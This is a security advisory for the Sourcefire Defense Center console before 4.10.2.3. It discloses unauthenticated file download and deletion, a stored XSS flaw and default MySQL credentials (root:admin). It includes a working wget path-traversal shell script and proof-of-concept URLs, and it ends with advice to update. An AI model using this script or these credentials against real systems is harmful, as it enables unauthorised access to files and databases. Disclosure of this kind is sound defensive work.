-- Product description (from vendor site):
The Sourcefire Defense Center(R) management console is the "nerve center" of the
Sourcefire 3D(R) System. It provides a powerful, easy-to-use interface for
categorizing events, generating recurring reports, scheduling automated IPS,
NGIPS, and NGFW detection content updates, configuring policies, and displaying
customizable dashboards to quickly communicate sensor feedback.


-- Problem Description:
The Sourcefire Defense Center(R) versions prior 4.10.2.3 were found to
be vulnerable to Arbitrary File Download, Deletion of files in a
specific directory,
Persistent XSS and database access using default credentials in some
circumstances.


-- Arbitrary File Download #1:
An unauthenticated attacker is able to download files within the DOCUMENT_ROOT
(not forbidden by Apache configuration, e.g. tar, yml etc.).

PoC: https://192.168.1.1/pagedata.yml
CVSS: 4.7 (provided by vendor)


-- Arbitrary File Download #2:
An unauthenticated attacker is able to download files that are
readable by the Apache
process, outside of DOCUMENT_ROOT.

PoC: included below
CVSS: 6.7 (provided by vendor)

-- cut --
#!/bin/sh

if [ -z $1 ] || [ -z $2 ]; then
       echo "$0 addr file"
       exit
fi

echo "--+ Arbitrary File Download PoC for Sourcefire 3D Defense Center
< 4.10.2.3 +--"
echo ""

which wget &>/dev/null
if [ $? -ne 0 ]; then
       echo "[!] wget not found."
       exit
fi

echo "[-] trying to download \"$2\"..."
echo ""
wget "https://$1/ComparisonViewer/report.cgi?file=../../../../../$2"

if [ $? -eq 0 ]; then
       echo "[+] file saved."
else
       echo "[!] file couldn't be saved."
fi
-- cut --


-- Deletion of files in a specific directory:
An unathenticated attacker is able to delete files that reside within
the "/var/tmp/streams" directory.  This directory does not exist
unless the Administrator creates it, and no files are stored there.

PoC: https://192.168.1.1/stream/ack.cgi?POSTDATA=foo
CVSS: 2.8 (provided by vendor)


-- Permanent XSS:
An authenticated attacker is able to bypass JavaScript validation and send
direct POST request to the script, which is responsible for renaming the new
tab in the dashboard. This may result in JavaScript code injection.

PoC: not provided
CVSS: 2.8 (provided by vendor)


-- Database Access using Default Credentials:
The attacker is able to access database remotely using default credentials
(root:admin) if only the port 3306 is opened. This password is not meant to be
changable. In addition, if an administrator has configured RUA functionality
and authorized the RUA agent to a specific IP address it is then possible to
use the RUA credentials to elevate MySQL privileges from that specifically
authorized host.

PoC: not provided
CVSS: not provided


-- Remediation:
Affected users are encouraged to install updates provied by the vendor.
The newest release at the time of this writing is 4.10.2.3.
